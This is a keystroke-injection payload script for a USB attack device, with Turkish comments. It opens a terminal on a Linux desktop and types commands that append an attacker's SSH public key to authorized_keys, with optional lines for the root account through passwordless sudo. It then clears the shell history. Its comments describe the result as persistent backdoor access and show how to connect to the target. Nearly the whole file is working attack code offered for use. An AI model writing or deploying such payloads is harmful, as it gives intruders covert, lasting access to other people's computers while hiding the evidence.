// ═══════════════════════════════════════════════════════════════════════════
// Payload: linux_ssh_key.js
// Target:  Linux (GUI)
// Time:    ~5 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: SSH authorized_keys'e public key ekler
// Kalıcı backdoor erişimi sağlar
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THIS VALUE                                       │
// └─────────────────────────────────────────────────────────────────────────┘
// Kendi SSH public key'ini buraya yapıştır
// ssh-keygen -t ed25519 ile oluşturabilirsin
var SSH_PUBLIC_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@kali";

// Alternatif: RSA key
// var SSH_PUBLIC_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
press("CTRL-ALT-t");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: CREATE .SSH DIRECTORY                                           │
// └─────────────────────────────────────────────────────────────────────────┘
type("mkdir -p ~/.ssh && chmod 700 ~/.ssh");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: ADD SSH KEY                                                     │
// └─────────────────────────────────────────────────────────────────────────┘
type("echo '" + SSH_PUBLIC_KEY + "' >> ~/.ssh/authorized_keys");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: SET PERMISSIONS                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
type("chmod 600 ~/.ssh/authorized_keys");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: OPTIONAL - ADD TO ROOT (if sudo available without password)    │
// └─────────────────────────────────────────────────────────────────────────┘
// Uncomment if target has passwordless sudo
// type("sudo mkdir -p /root/.ssh && sudo chmod 700 /root/.ssh");
// press("ENTER");
// delay(500);
// type("echo '" + SSH_PUBLIC_KEY + "' | sudo tee -a /root/.ssh/authorized_keys");
// press("ENTER");
// delay(500);
// type("sudo chmod 600 /root/.ssh/authorized_keys");
// press("ENTER");
// delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 7: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("history -c && exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ USAGE                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Bağlanmak için:
// ssh -i ~/.ssh/id_ed25519 user@TARGET_IP
// 
// SSH key oluşturmak için:
// ssh-keygen -t ed25519 -C "attacker"
// cat ~/.ssh/id_ed25519.pub  (bunu SSH_PUBLIC_KEY'e yapıştır)

